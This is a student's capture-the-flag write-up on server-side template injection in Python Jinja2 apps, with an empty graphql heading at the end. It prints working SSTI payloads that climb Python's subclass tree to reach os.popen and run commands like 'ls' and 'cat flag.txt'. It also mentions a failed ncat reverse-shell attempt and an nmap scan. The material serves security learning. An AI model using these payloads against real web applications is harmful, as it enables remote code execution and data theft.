# Web Security writeup
by Ka Po Chau

# ssti
By following [this guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), I was able to check the ssti injection and confirmed that it is python jinja2.
> {{7*'7'}} = 7777777
> 
> {{foobar}} Nothing

## ssti1
just using `{{config}}` I was able to find the flag inside it.

## ssti2
[Detailed steps](https://secure-cookie.io/attacks/ssti/) to the ssti attack. I had to first find the number of `warnings.catch_warnings` with 
```
{{ "foo".__class__.__base__.__subclasses__() }}
```
It is 305th line, which means I can then do:
```
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("cat flag.txt").read() }}
```
and got the flag from `flag.txt`.

## ssti3
Same as ssti2 except `warnings.catch_warnings` is at 299.

```
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("./getFlag").read() }}
```

## ssti 4
I was unable to solve this challenge, tried to do an ls that showed:
```
app.py
config.py
docker-compose.yml
index.html
```
and read the docker-compose.yml, but could not get the port of the old docker container. nmap scan showed 1 ssh port and 2 html ports, but could not figure out a way to attack. Also tried to reverse shell with ncat but was not working.

# graphql




